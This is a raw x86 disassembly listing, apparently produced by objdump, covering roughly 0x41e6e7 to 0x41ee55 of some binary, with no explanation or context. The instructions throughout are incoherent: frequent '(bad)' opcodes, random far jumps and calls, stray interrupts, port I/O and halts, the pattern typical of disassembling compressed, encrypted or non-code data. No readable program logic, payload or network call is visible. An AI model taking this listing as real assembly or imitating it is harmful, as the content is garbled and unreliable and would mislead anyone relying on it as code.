  41e6e7:	jmp    0x41e715
  41e6e9:	pop    eax
  41e6ea:	inc    ecx
  41e6eb:	fwait
  41e6ec:	imul   ebx,esi,0xff6c677d
  41e6f2:	xchg   ebp,eax
  41e6f3:	mov    al,ds:0xa4dd52c4
  41e6f8:	inc    ecx
  41e6f9:	cmp    eax,0x53117552
  41e6fe:	dec    eax
  41e6ff:	cmp    ecx,DWORD PTR [ebp+0x4d]
  41e702:	rcr    ebx,0xd1
  41e705:	adc    BYTE PTR [edi],al
  41e707:	jge    0x41e693
  41e709:	xchg   edi,eax
  41e70a:	mov    DWORD PTR [ecx+0x1e],ebx
  41e70d:	adc    DWORD PTR [ebx*2+0x40b35304],0x4b63caca
  41e718:	and    ebx,ebp
  41e71a:	fiadd  DWORD PTR [edi-0x7fa40d8d]
  41e720:	jle    0x41e6f9
  41e722:	jae    0x41e71d
  41e724:	jne    0x41e721
  41e726:	out    dx,eax
  41e727:	and    BYTE PTR [ebx],dl
  41e729:	fimul  WORD PTR [esi-0x3b33bde3]
  41e72f:	int3   
  41e730:	icebp  
  41e731:	cs or  al,0xa5
  41e734:	mov    edi,DWORD PTR [edx-0x41ac48d6]
  41e73a:	loope  0x41e726
  41e73c:	cmc    
  41e73d:	mov    ecx,0x7359114b
  41e742:	loope  0x41e756
  41e744:	int3   
  41e745:	or     ch,BYTE PTR [edi-0x143a758b]
  41e74b:	dec    edx
  41e74c:	fbld   TBYTE PTR [ecx-0x3a]
  41e74f:	test   al,0xc3
  41e751:	jnp    0x41e7bb
  41e753:	mov    ebp,0xc3d88f63
  41e758:	sbb    al,0x48
  41e75a:	sbb    al,0x11
  41e75c:	and    ebp,eax
  41e75e:	es daa 
  41e760:	fbld   TBYTE PTR [edx]
  41e762:	jge    0x41e711
  41e764:	inc    edi
  41e765:	sar    BYTE PTR [ebx],cl
  41e767:	pop    ds
  41e768:	cmp    al,0x71
  41e76a:	test   DWORD PTR [edi],edx
  41e76c:	pop    ecx
  41e76d:	fbstp  TBYTE PTR [edx+0x33]
  41e770:	jl     0x41e70d
  41e772:	mov    edi,0xce3d9680
  41e777:	mov    dh,0x4a
  41e779:	test   BYTE PTR [eax],0xbc
  41e77c:	lods   eax,DWORD PTR ds:[esi]
  41e77d:	(bad)  
  41e77e:	xchg   edx,eax
  41e77f:	xchg   edi,eax
  41e780:	add    eax,0x2945603b
  41e785:	repnz xor DWORD PTR [edi-0x67],0x4ee4be9d
  41e78d:	xchg   ecx,eax
  41e78e:	sub    dh,BYTE PTR [eax]
  41e790:	dec    esi
  41e791:	call   0x1b66:0xfc05586d
  41e798:	push   edi
  41e799:	jb     0x41e7dd
  41e79b:	test   al,0xe6
  41e79d:	stos   DWORD PTR es:[edi],eax
  41e79e:	sub    al,0x3a
  41e7a0:	cmp    BYTE PTR [ebx],dh
  41e7a2:	pop    esp
  41e7a3:	es rdtsc 
  41e7a6:	and    ebx,DWORD PTR [eax-0x6268857d]
  41e7ac:	mov    esp,0xec494fe4
  41e7b1:	jl     0x41e800
  41e7b3:	dec    esi
  41e7b4:	sbb    dh,BYTE PTR ds:0x4366a493
  41e7ba:	stos   BYTE PTR es:[edi],al
  41e7bb:	or     ebx,ecx
  41e7bd:	xchg   esi,eax
  41e7be:	inc    esp
  41e7bf:	(bad)  
  41e7c0:	es call 0xe30623b6
  41e7c6:	in     eax,0x6a
  41e7c8:	cmp    DWORD PTR [eax+edi*1-0x7d3a51d1],ebp
  41e7cf:	out    dx,eax
  41e7d0:	or     al,0x5
  41e7d2:	jg     0x41e78b
  41e7d4:	sub    eax,0x41f7c00d
  41e7d9:	test   ebp,esp
  41e7db:	pop    ebp
  41e7dc:	pop    eax
  41e7dd:	rol    BYTE PTR [ecx+0x5fa002e7],1
  41e7e3:	cs dec ecx
  41e7e5:	sbb    eax,0xf5243948
  41e7ea:	test   BYTE PTR [eax],ah
  41e7ec:	sbb    ebx,DWORD PTR [ecx-0x78]
  41e7ef:	and    esi,0xffffffbb
  41e7f2:	pop    ebp
  41e7f3:	jmp    DWORD PTR [ecx+0x7e47f937]
  41e7f9:	jmp    0x41e7c3
  41e7fb:	popf   
  41e7fc:	fld    DWORD PTR [esi]
  41e7fe:	add    al,0x18
  41e800:	(bad)  
  41e801:	fstp   DWORD PTR [edi-0x3db830c]
  41e807:	sub    al,0x5
  41e809:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e80a:	dec    eax
  41e80b:	out    0x96,al
  41e80d:	(bad)  
  41e80e:	jb     0x41e86f
  41e810:	(bad)  
  41e811:	pop    ebx
  41e812:	ficomp WORD PTR [esi]
  41e814:	mov    bl,0x64
  41e816:	push   ebx
  41e817:	les    ebp,FWORD PTR [ecx]
  41e819:	xor    al,0x92
  41e81b:	mov    bh,0x39
  41e81d:	fidiv  WORD PTR [edi-0x46d1975d]
  41e823:	call   0x482:0x9647d80e
  41e82a:	add    esi,DWORD PTR [eax+0x75aace17]
  41e830:	sub    ecx,eax
  41e832:	pop    eax
  41e833:	jle    0x41e864
  41e835:	imul   DWORD PTR [eax]
  41e837:	mov    BYTE PTR [ebx-0x4fb4c1f0],al
  41e83d:	jmp    0x15230e7
  41e842:	lods   eax,DWORD PTR ds:[esi]
  41e843:	sbb    al,0x38
  41e845:	push   ss
  41e846:	notrack jmp DWORD PTR ds:0x654fc377
  41e84d:	out    0x1d,eax
  41e84f:	push   esp
  41e850:	retf   0xa569
  41e853:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e854:	fdiv   QWORD PTR [edx]
  41e856:	fbld   TBYTE PTR [ebx]
  41e858:	push   esp
  41e859:	pop    ss
  41e85a:	dec    ebp
  41e85b:	leave  
  41e85c:	dec    ebp
  41e85d:	xrelease mov DWORD PTR [ebx+edx*4+0x1f474d33],ebp
  41e865:	jge    0x41e887
  41e867:	neg    DWORD PTR [ebp-0x5447f4a]
  41e86d:	int    0xba
  41e86f:	les    edi,FWORD PTR [ebx-0x45]
  41e872:	add    al,0x38
  41e874:	jnp    0x41e87c
  41e876:	std    
  41e877:	and    BYTE PTR [ebp-0x2f43059d],dh
  41e87d:	adc    eax,0xf685ec8d
  41e882:	test   BYTE PTR [ebp+0x7dfd5f12],bl
  41e888:	aaa    
  41e889:	in     al,0x7b
  41e88b:	loope  0x41e810
  41e88d:	inc    ebp
  41e88e:	iret   
  41e88f:	sti    
  41e890:	(bad)  
  41e891:	and    eax,0x81a262cb
  41e896:	jmp    FWORD PTR ds:0xfd70a616
  41e89c:	mov    dl,0x61
  41e89e:	jns    0x41e8a3
  41e8a0:	pop    ds
  41e8a1:	adc    ch,bh
  41e8a3:	mov    dl,0xb4
  41e8a5:	pusha  
  41e8a6:	and    edx,DWORD PTR [edx-0x2da032a6]
  41e8ac:	push   ss
  41e8ad:	cwde   
  41e8ae:	das    
  41e8af:	ret    0x4edd
  41e8b2:	jmp    0x8ec2:0x462de787
  41e8b9:	fstp   DWORD PTR [ebx+eax*8]
  41e8bc:	es int 0xa4
  41e8bf:	imul   esi,DWORD PTR [eax-0x298b6d7d],0xffabce06
  41e8c9:	sbb    ecx,DWORD PTR [ecx+0x144472ef]
  41e8cf:	hlt    
  41e8d0:	jp     0x41e8ae
  41e8d2:	mov    bl,bh
  41e8d4:	pop    ss
  41e8d5:	jge    0x41e898
  41e8d7:	cdq    
  41e8d8:	jge    0x41e8eb
  41e8da:	or     ebp,DWORD PTR ds:[esi+0x29]
  41e8de:	cmp    dl,ch
  41e8e0:	lock not cl
  41e8e3:	jae    0x41e86c
  41e8e5:	dec    edx
  41e8e6:	inc    esi
  41e8e7:	outs   dx,DWORD PTR ds:[esi]
  41e8e8:	add    DWORD PTR [edx+0x43],eax
  41e8eb:	mov    ch,0x68
  41e8ed:	mov    WORD PTR [eax-0x41],?
  41e8f0:	jecxz  0x41e915
  41e8f2:	int3   
  41e8f3:	js     0x41e8cb
  41e8f5:	inc    esi
  41e8f6:	jecxz  0x41e8f3
  41e8f8:	cmp    dl,BYTE PTR [ecx-0x73]
  41e8fb:	aad    0xf4
  41e8fd:	imul   esi,DWORD PTR [edx+ebx*2+0x63],0x6b4d4916
  41e905:	xchg   edx,eax
  41e906:	cmc    
  41e907:	xchg   ecx,eax
  41e908:	stos   DWORD PTR es:[edi],eax
  41e909:	popf   
  41e90a:	mov    edi,0xfd6da6c1
  41e90f:	mov    dh,0x3a
  41e911:	lock retf 
  41e913:	jle    0x41e8c0
  41e915:	mov    ds,WORD PTR [edi+0x77]
  41e918:	pop    ebx
  41e919:	sbb    ah,ch
  41e91b:	cwde   
  41e91c:	psadbw mm2,QWORD PTR ds:0xba28bb48
  41e923:	inc    ebx
  41e924:	jmp    DWORD PTR [esi-0x7c]
  41e927:	push   0xffffffb5
  41e929:	xor    ecx,DWORD PTR [edx-0x17]
  41e92c:	imul   ecx,ecx,0xffffffe4
  41e92f:	in     eax,0x54
  41e931:	loope  0x41e98b
  41e933:	inc    ebp
  41e934:	xchg   ebx,eax
  41e935:	add    DWORD PTR [ebp+ebp*1-0x7f],esi
  41e939:	out    dx,eax
  41e93a:	lock adc ebp,DWORD PTR [ecx]
  41e93d:	or     DWORD PTR [ebx],ebx
  41e93f:	(bad)  
  41e940:	mov    eax,ds:0x78426b21
  41e945:	in     al,dx
  41e946:	enter  0x6463,0xe3
  41e94a:	cmp    ebx,esi
  41e94c:	jp     0x41e95c
  41e94e:	mov    ds:0xc8bd822,al
  41e953:	div    BYTE PTR [ecx+0x59]
  41e956:	push   0x2a
  41e958:	adc    DWORD PTR [ebx+ecx*4+0x52588626],ecx
  41e95f:	mov    ds:0x97381e30,al
  41e964:	fist   DWORD PTR [esi-0xe46f248]
  41e96a:	aam    0xa1
  41e96c:	or     esi,esi
  41e96e:	and    eax,0x92fafa4f
  41e973:	pop    es
  41e974:	push   0xffffffb2
  41e976:	daa    
  41e977:	mov    ds:0x986b3998,al
  41e97c:	inc    eax
  41e97d:	(bad)
  41e980:	in     al,0x5b
  41e982:	clc    
  41e983:	sub    ebp,DWORD PTR [edi]
  41e985:	lea    eax,[esi]
  41e987:	bound  ebp,QWORD PTR [eax+0x2f]
  41e98a:	mov    ah,0xf8
  41e98c:	jle    0x41e986
  41e98e:	rcl    DWORD PTR [ecx],0x5b
  41e991:	pop    esi
  41e992:	mov    edx,cs
  41e994:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e995:	loope  0x41e9c1
  41e997:	cmc    
  41e998:	pop    ebx
  41e999:	nop
  41e99a:	inc    esp
  41e99b:	adc    BYTE PTR [edi],al
  41e99d:	iret   
  41e99e:	pop    edx
  41e99f:	retf   0xde73
  41e9a2:	repz adc BYTE PTR [ecx+0x54ddc93c],0x5c
  41e9aa:	popf   
  41e9ab:	sub    eax,0x760b9906
  41e9b0:	pop    esi
  41e9b1:	sti    
  41e9b2:	adc    DWORD PTR [ebx],0xfffffff9
  41e9b5:	xor    al,bh
  41e9b7:	adc    DWORD PTR [eax],esi
  41e9b9:	pop    ebp
  41e9ba:	jp     0x41e9e0
  41e9bc:	rcr    BYTE PTR [esi+0x7d],1
  41e9bf:	(bad)  
  41e9c0:	lods   eax,DWORD PTR ds:[esi]
  41e9c1:	mov    ds:0x49510fe8,al
  41e9c6:	mov    dh,0xf2
  41e9c8:	fwait
  41e9c9:	mov    edx,ebx
  41e9cb:	xor    ecx,eax
  41e9cd:	pop    ebx
  41e9ce:	xchg   edx,eax
  41e9cf:	mov    ds:0x25a34f2f,eax
  41e9d4:	stos   DWORD PTR es:[edi],eax
  41e9d5:	lahf   
  41e9d6:	pop    ebp
  41e9d7:	push   0x18
  41e9d9:	jecxz  0x41e96f
  41e9db:	or     BYTE PTR [edx-0x2b15b3b6],bl
  41e9e1:	cld    
  41e9e2:	ins    BYTE PTR es:[edi],dx
  41e9e3:	iret   
  41e9e4:	xchg   BYTE PTR [edx+0x3ea3eee6],bl
  41e9ea:	mov    BYTE PTR [esp+edx*8+0x359325ed],ah
  41e9f1:	sub    edi,DWORD PTR [ecx-0x5c]
  41e9f4:	retf   0xf2ec
  41e9f7:	mov    es,WORD PTR [edi+0x52]
  41e9fa:	ss daa 
  41e9fc:	retf   0xd7a4
  41e9ff:	(bad)  
  41ea00:	ins    DWORD PTR es:[edi],dx
  41ea01:	mov    bh,0x2b
  41ea03:	call   0xa337a5d0
  41ea08:	push   ds
  41ea09:	in     eax,dx
  41ea0a:	inc    ebx
  41ea0b:	mov    esi,0x1953c8b5
  41ea10:	mov    eax,0x31773c5f
  41ea15:	adc    esp,DWORD PTR [esi+0x19]
  41ea18:	pop    ss
  41ea19:	(bad)  
  41ea1a:	int    0x38
  41ea1c:	pop    ebx
  41ea1d:	popw   ss
  41ea1f:	xchg   esp,eax
  41ea20:	mov    ss,WORD PTR [esi-0x450f9111]
  41ea26:	repz hlt 
  41ea28:	das    
  41ea29:	int3   
  41ea2a:	mov    eax,0x357c001e
  41ea2f:	adc    al,ch
  41ea31:	lahf   
  41ea32:	cmp    DWORD PTR [ebp+0x25],edi
  41ea35:	dec    esi
  41ea36:	jecxz  0x41ea84
  41ea38:	mov    edi,DWORD PTR [ebx-0x6d2ca659]
  41ea3e:	test   BYTE PTR [edx+edi*8],bh
  41ea41:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ea42:	xlat   BYTE PTR ds:[ebx]
  41ea43:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ea44:	sbb    BYTE PTR [ebx+0x67],ah
  41ea47:	sbb    eax,0x47e0ecb8
  41ea4c:	push   esi
  41ea4d:	dec    ecx
  41ea4e:	pop    esi
  41ea4f:	ror    DWORD PTR ds:0xaf7afbb7,cl
  41ea55:	outs   dx,BYTE PTR ss:[esi]
  41ea57:	add    eax,0x4fd31afd
  41ea5c:	xor    DWORD PTR [edi+0x32],ebp
  41ea5f:	sbb    eax,0xff57e4e9
  41ea64:	es int 0xe8
  41ea67:	or     BYTE PTR [ebp+0x3df257d6],0x87
  41ea6e:	fist   WORD PTR [eax+0x4a96c623]
  41ea74:	dec    edx
  41ea75:	loop   0x41ea95
  41ea77:	inc    ecx
  41ea78:	inc    ebp
  41ea79:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ea7a:	jle    0x41ea7d
  41ea7c:	call   0xcb022f10
  41ea81:	mov    ebp,0x66ff5ee5
  41ea86:	inc    ebx
  41ea87:	pop    ebx
  41ea88:	push   ss
  41ea89:	hlt    
  41ea8a:	pop    edx
  41ea8b:	call   0xa1782b77
  41ea90:	loopne 0x41eace
  41ea92:	mov    bh,0xda
  41ea94:	jns    0x41ea6f
  41ea96:	mov    edx,0x44259b22
  41ea9b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ea9c:	out    0x3c,al
  41ea9e:	and    BYTE PTR [esi+ebx*8+0x63],al
  41eaa2:	les    ebx,FWORD PTR [ebp+ecx*4-0x5992238e]
  41eaa9:	nop
  41eaaa:	push   cs
  41eaab:	ss jnp 0x41eb14
  41eaae:	mov    edi,0x748ffff6
  41eab3:	test   al,0x48
  41eab5:	xlat   BYTE PTR ds:[ebx]
  41eab6:	inc    edi
  41eab7:	repnz loop 0x41eb23
  41eaba:	xchg   DWORD PTR [edx+edi*8],esi
  41eabd:	sub    BYTE PTR [edi+0x47cc1f39],ch
  41eac3:	into   
  41eac4:	gs inc ebx
  41eac6:	dec    edx
  41eac7:	outs   dx,BYTE PTR ds:[esi]
  41eac8:	xchg   ebx,eax
  41eac9:	mov    ds:0x7d891b13,eax
  41eace:	int3   
  41eacf:	(bad)  
  41ead0:	cmp    ah,ah
  41ead2:	sar    cl,cl
  41ead4:	js     0x41eace
  41ead6:	shl    DWORD PTR [esi+0x11],cl
  41ead9:	mov    al,ds:0x781f5c76
  41eade:	dec    esp
  41eadf:	mov    dh,0xc2
  41eae1:	ins    BYTE PTR es:[edi],dx
  41eae2:	mov    ds:0x44e0bef6,eax
  41eae7:	fisttp WORD PTR es:[ebp-0xf]
  41eaeb:	loope  0x41eb06
  41eaed:	js     0x41ea82
  41eaef:	pop    ebx
  41eaf0:	ins    DWORD PTR es:[edi],dx
  41eaf1:	ja     0x41eb6a
  41eaf3:	iret   
  41eaf4:	or     esp,DWORD PTR [ecx-0x7a0d68c]
  41eafa:	mov    WORD PTR [ecx+0x29d1127a],gs
  41eb00:	dec    ebx
  41eb01:	bound  eax,QWORD PTR [ecx-0x4c]
  41eb04:	sub    eax,0x1be54571
  41eb09:	rcr    cl,0xc5
  41eb0c:	or     bh,BYTE PTR [esi+0x32976423]
  41eb12:	out    dx,eax
  41eb13:	jge    0x41eab1
  41eb15:	data16 stos BYTE PTR es:[edi],al
  41eb17:	inc    ebp
  41eb18:	lods   al,BYTE PTR ds:[esi]
  41eb19:	cmp    BYTE PTR [ecx+0x6bb07276],bl
  41eb1f:	ins    BYTE PTR es:[edi],dx
  41eb20:	test   al,0x1c
  41eb22:	arpl   bx,cx
  41eb24:	jle    0x41eb50
  41eb26:	iret   
  41eb27:	xchg   edx,eax
  41eb28:	adc    BYTE PTR [edx+0x69adc94a],ch
  41eb2e:	mov    edi,0xff20a79e
  41eb33:	xor    al,0x4e
  41eb35:	hlt    
  41eb36:	lods   al,BYTE PTR ds:[esi]
  41eb37:	daa    
  41eb38:	or     al,0x48
  41eb3a:	ror    BYTE PTR [eax],cl
  41eb3c:	mov    edi,0xedcb515e
  41eb41:	push   edi
  41eb42:	das    
  41eb43:	push   ebx
  41eb44:	or     dh,dl
  41eb46:	fwait
  41eb47:	into   
  41eb48:	adc    esp,DWORD PTR [eax+eiz*1+0xc]
  41eb4c:	cli    
  41eb4d:	fild   QWORD PTR fs:[ebx+0x28c9a98c]
  41eb54:	or     al,0xa0
  41eb56:	push   es
  41eb57:	inc    ebp
  41eb58:	fisttp WORD PTR [ecx-0x47a3d209]
  41eb5e:	icebp  
  41eb5f:	sbb    eax,0xebf43786
  41eb64:	arpl   WORD PTR [ebx-0x181acb4a],si
  41eb6a:	xor    al,0x27
  41eb6c:	pop    esp
  41eb6d:	daa    
  41eb6e:	mov    bh,0x5f
  41eb70:	mov    edx,0xc4badc06
  41eb75:	sbb    BYTE PTR [edx],ah
  41eb77:	or     eax,0xb8e7a603
  41eb7c:	or     al,BYTE PTR [ebx-0x7f5642ee]
  41eb82:	outs   dx,BYTE PTR ds:[esi]
  41eb83:	mov    al,ds:0xb18bcaa1
  41eb88:	(bad)  
  41eb89:	push   ecx
  41eb8a:	xchg   BYTE PTR [ecx+edx*8],ah
  41eb8d:	dec    eax
  41eb8e:	cmp    edi,DWORD PTR [eax+edx*2+0x13]
  41eb92:	neg    DWORD PTR [edi]
  41eb94:	les    eax,FWORD PTR [edi]
  41eb96:	loop   0x41ebcf
  41eb98:	jbe    0x41eb32
  41eb9a:	push   0x9b2fa214
  41eb9f:	add    eax,0xc3feef81
  41eba4:	mov    ebp,0x3bb4dea9
  41eba9:	or     DWORD PTR [ecx+esi*1+0x43],eax
  41ebad:	pushf  
  41ebae:	fdivr  st,st(6)
  41ebb0:	ins    DWORD PTR es:[edi],dx
  41ebb1:	push   edi
  41ebb2:	pop    edi
  41ebb3:	pushf  
  41ebb4:	int    0xd9
  41ebb6:	fdiv   QWORD PTR [eax+0x16]
  41ebb9:	mov    esi,0x5d6b4bbd
  41ebbe:	and    DWORD PTR [esi-0x48d4eb28],ebx
  41ebc4:	pop    edi
  41ebc5:	cli    
  41ebc6:	sbb    al,0xce
  41ebc8:	push   ds
  41ebc9:	add    ch,BYTE PTR [ebp-0x52d426d2]
  41ebcf:	mov    ah,0x61
  41ebd1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ebd2:	jg     0x41eb89
  41ebd4:	out    dx,al
  41ebd5:	xchg   ebx,eax
  41ebd6:	ret    0xa423
  41ebd9:	fdiv   QWORD PTR [bx+si-0xf]
  41ebdd:	lods   eax,DWORD PTR ds:[esi]
  41ebde:	(bad)  [eax+0x231ff305]
  41ebe4:	cmp    eax,0xbe83d0f7
  41ebe9:	push   esp
  41ebea:	ret    0xd604
  41ebed:	(bad)  
  41ebee:	cmp    ebx,DWORD PTR [ebp+0x4e]
  41ebf1:	(bad)  
  41ebf2:	adc    eax,0xa9602855
  41ebf7:	div    BYTE PTR cs:[ecx]
  41ebfa:	xor    BYTE PTR [ecx],ch
  41ebfc:	jle    0x41ebfb
  41ebfe:	xor    al,0xcb
  41ec00:	arpl   WORD PTR [ebp+0x7c],bp
  41ec03:	popa   
  41ec04:	repz loope 0x41ec42
  41ec07:	leave  
  41ec08:	jmp    0xdd7e:0x21ec9b71
  41ec0f:	std    
  41ec10:	or     eax,0x153c2a2e
  41ec15:	inc    edx
  41ec16:	and    edx,DWORD PTR [ecx]
  41ec18:	cs push cs
  41ec1a:	inc    esp
  41ec1b:	sbb    ah,BYTE PTR [ecx+0x5e57f9c3]
  41ec21:	daa    
  41ec22:	pop    ss
  41ec23:	push   ss
  41ec24:	xchg   esp,eax
  41ec25:	mov    edi,0x28348a12
  41ec2b:	stos   BYTE PTR es:[edi],al
  41ec2c:	pushf  
  41ec2d:	daa    
  41ec2e:	lock out dx,eax
  41ec30:	jl     0x41ec75
  41ec32:	xchg   esi,eax
  41ec33:	les    ebx,FWORD PTR [edx+0x2323b478]
  41ec39:	inc    esp
  41ec3a:	out    dx,al
  41ec3b:	loope  0x41ec27
  41ec3d:	retf   0x8b60
  41ec40:	ret    0x291b
  41ec43:	outs   dx,BYTE PTR ds:[esi]
  41ec44:	mov    eax,ds:0x5cda560
  41ec49:	rcr    BYTE PTR [ebp+0x5309af83],0xe9
  41ec50:	loope  0x41ec1c
  41ec52:	push   es
  41ec53:	mov    WORD PTR [eax],cs
  41ec55:	cmp    eax,0xaa670a39
  41ec5a:	adc    eax,0x2a156d1a
  41ec5f:	ins    DWORD PTR es:[edi],dx
  41ec60:	jnp    0x41ec38
  41ec62:	sbb    al,ah
  41ec64:	out    0x7f,eax
  41ec66:	std    
  41ec67:	pop    esp
  41ec68:	fwait
  41ec69:	sub    DWORD PTR [edx+0x4e],0xffffffdf
  41ec6d:	leave  
  41ec6e:	outs   dx,DWORD PTR ds:[esi]
  41ec6f:	mov    edi,ebx
  41ec71:	cld    
  41ec72:	int3   
  41ec73:	test   DWORD PTR [ecx],ecx
  41ec75:	cli    
  41ec76:	dec    BYTE PTR [ebx+0x5a]
  41ec79:	ja     0x41ec4f
  41ec7b:	add    eax,0x47df61cb
  41ec80:	int    0x65
  41ec82:	xchg   ecx,eax
  41ec83:	sbb    ebp,DWORD PTR [edi]
  41ec85:	jmp    0x41ec23
  41ec87:	aad    0x95
  41ec89:	ret    0x37f1
  41ec8c:	and    BYTE PTR [edx+0x6b],al
  41ec8f:	outs   dx,DWORD PTR ds:[esi]
  41ec90:	idiv   BYTE PTR gs:[edi]
  41ec93:	out    0x62,eax
  41ec95:	mov    ecx,0xf37e888b
  41ec9a:	or     DWORD PTR [edi],ecx
  41ec9c:	lds    edx,FWORD PTR [ebx]
  41ec9e:	or     edx,DWORD PTR [eax]
  41eca0:	rol    DWORD PTR [esi+0x665b4826],1
  41eca6:	cmp    edi,DWORD PTR [edi-0x642bae01]
  41ecac:	mov    al,ds:0xffb4b0fe
  41ecb1:	add    bl,BYTE PTR [esi+0x2d009ff6]
  41ecb7:	xchg   esp,eax
  41ecb8:	dec    esi
  41ecb9:	mov    edi,0x3073c7c6
  41ecbe:	adc    eax,0xc6e915b8
  41ecc3:	(bad)  
  41ecc4:	(bad)  
  41ecc5:	xor    eax,0xb5c7fdf9
  41ecca:	psubusb mm7,QWORD PTR [edi]
  41eccd:	xchg   ecx,eax
  41ecce:	push   edx
  41eccf:	add    ecx,DWORD PTR [eax]
  41ecd1:	jns    0x41eca0
  41ecd3:	jnp    0x41ecb9
  41ecd5:	jp     0x41ed07
  41ecd7:	neg    BYTE PTR [ebx+0x65238ccf]
  41ecdd:	icebp  
  41ecde:	lds    edi,FWORD PTR [esi-0x42]
  41ece1:	add    ebp,esp
  41ece3:	sbb    ecx,DWORD PTR [edi-0x74e6f6a0]
  41ece9:	pop    esp
  41ecea:	jmp    0x69c5:0x99ee2206
  41ecf1:	ret    
  41ecf2:	jb     0x41ed10
  41ecf4:	adc    ecx,DWORD PTR [esp+edi*2-0x15686192]
  41ecfb:	jmp    0x889a8130
  41ed00:	jno    0x41ed74
  41ed02:	sbb    BYTE PTR [esi+0x351b334a],cl
  41ed08:	inc    edi
  41ed09:	add    al,0x23
  41ed0b:	das    
  41ed0c:	xchg   DWORD PTR [eax],edi
  41ed0e:	sub    edi,DWORD PTR [edx]
  41ed10:	loopne 0x41ed52
  41ed12:	in     al,0x62
  41ed14:	lds    eax,FWORD PTR [eax+eax*4-0x3551ee53]
  41ed1b:	xor    edx,DWORD PTR [ebx-0x4925b0e]
  41ed21:	add    eax,0xcc8e6fce
  41ed26:	lock pusha 
  41ed28:	jae    0x41ecc0
  41ed2a:	adc    dl,BYTE PTR [esi+0x4e05676f]
  41ed30:	jae    0x41eda4
  41ed32:	ss push edx
  41ed34:	jno    0x41ed10
  41ed36:	add    BYTE PTR [edx+0x3a],bh
  41ed39:	mov    al,ds:0x4a3bedf3
  41ed3e:	xor    BYTE PTR [ecx+0x50],bl
  41ed41:	xor    DWORD PTR [edi+0x6e],ebp
  41ed44:	dec    edi
  41ed45:	push   esi
  41ed46:	sbb    al,0xf6
  41ed48:	sbb    ebp,esi
  41ed4a:	push   esp
  41ed4b:	push   esi
  41ed4c:	push   ecx
  41ed4d:	std    
  41ed4e:	in     al,0xfe
  41ed50:	aam    0x2c
  41ed52:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ed53:	push   ecx
  41ed54:	(bad)  
  41ed55:	int3   
  41ed56:	ins    DWORD PTR es:[edi],dx
  41ed57:	cdq    
  41ed58:	pop    ecx
  41ed59:	mov    edx,0x9ab56dcf
  41ed5e:	fbld   TBYTE PTR [di]
  41ed61:	jo     0x41edb8
  41ed63:	xor    esp,DWORD PTR [esi-0x37]
  41ed66:	or     al,0x55
  41ed68:	and    eax,0xe48da912
  41ed6d:	(bad)
  41ed71:	cmc    
  41ed72:	nop
  41ed73:	stos   DWORD PTR es:[edi],eax
  41ed74:	gs jecxz 0x41ed07
  41ed77:	mov    cl,0x29
  41ed79:	and    eax,0x8a5e4f28
  41ed7e:	adc    al,0xf2
  41ed80:	mov    esi,esi
  41ed82:	pop    eax
  41ed83:	(bad)  
  41ed85:	in     eax,0xa9
  41ed87:	aaa    
  41ed88:	clc    
  41ed89:	mov    esi,0xac50550e
  41ed8e:	or     esi,DWORD PTR [ebp+0x70fc8ebf]
  41ed94:	add    dl,cl
  41ed96:	cdq    
  41ed97:	push   esp
  41ed98:	xchg   edx,eax
  41ed99:	cli    
  41ed9a:	jnp    0x41edbc
  41ed9c:	cld    
  41ed9d:	cld    
  41ed9e:	mov    ah,0x6
  41eda0:	mov    edx,0xb79b8c4e
  41eda5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41eda6:	jmp    0x41ed48
  41eda8:	cmp    ch,BYTE PTR [edx-0x32]
  41edab:	inc    BYTE PTR [eax]
  41edad:	mov    ebx,0x5c5100c0
  41edb2:	out    dx,al
  41edb3:	pop    eax
  41edb4:	mov    edi,0x3b4bd6e1
  41edb9:	jbe    0x41edd0
  41edbb:	add    DWORD PTR [edi+0x49ece026],0xffffffaa
  41edc2:	add    edi,DWORD PTR [ebx]
  41edc4:	mov    edx,0xbb5d7e7b
  41edc9:	cwde   
  41edca:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41edcb:	rol    BYTE PTR [edx+0x7fe0f296],1
  41edd1:	les    ebp,FWORD PTR [edx-0x2b]
  41edd4:	xchg   dh,ah
  41edd6:	jp     0x41edc5
  41edd8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41edd9:	fcmovnu st,st(0)
  41eddb:	aas    
  41eddc:	fsubr  DWORD PTR [ecx]
  41edde:	imul   ebx,DWORD PTR [ecx-0x6d],0x8217b6cd
  41ede5:	sub    DWORD PTR [edi+0x254df33c],edi
  41edeb:	mov    al,0xa
  41eded:	mov    ebx,0xaa408e5f
  41edf2:	dec    edi
  41edf3:	pop    esi
  41edf4:	sbb    DWORD PTR [ecx],esi
  41edf6:	(bad)  
  41edf7:	xor    al,0x5b
  41edf9:	mov    eax,ds:0x22370bb
  41edfe:	mov    edi,0x9b151f06
  41ee03:	call   0xedde:0x51fccc7f
  41ee0a:	mov    dh,0xda
  41ee0c:	sbb    eax,0x7c00c2c5
  41ee11:	fadd   DWORD PTR [edx+ebx*8-0x169dcadb]
  41ee18:	imul   esi,DWORD PTR [eax+ebx*8],0x25151f2c
  41ee1f:	dec    ebx
  41ee20:	stos   BYTE PTR es:[edi],al
  41ee21:	dec    eax
  41ee22:	pop    edx
  41ee23:	retf   0x759
  41ee26:	ins    BYTE PTR es:[edi],dx
  41ee27:	test   DWORD PTR [ecx+0x5e],0x95c3ce84
  41ee2e:	jp     0x41eea0
  41ee30:	mov    ch,0x5a
  41ee32:	mov    ah,0x39
  41ee34:	cwde   
  41ee35:	(bad)  
  41ee36:	aam    0xdd
  41ee38:	inc    esp
  41ee39:	repz lds eax,FWORD PTR [edi-0xc114761]
  41ee40:	cmp    ch,bl
  41ee42:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ee43:	sub    WORD PTR [eax],si
  41ee46:	out    dx,eax
  41ee47:	dec    ebp
  41ee48:	in     eax,0xde
  41ee4a:	and    esi,DWORD PTR [eax-0x6fac6e6b]
  41ee50:	dec    eax
  41ee51:	cs jb  0x41ee8a
  41ee54:	push   esp
  41ee55:	jnp    0x41ee6d
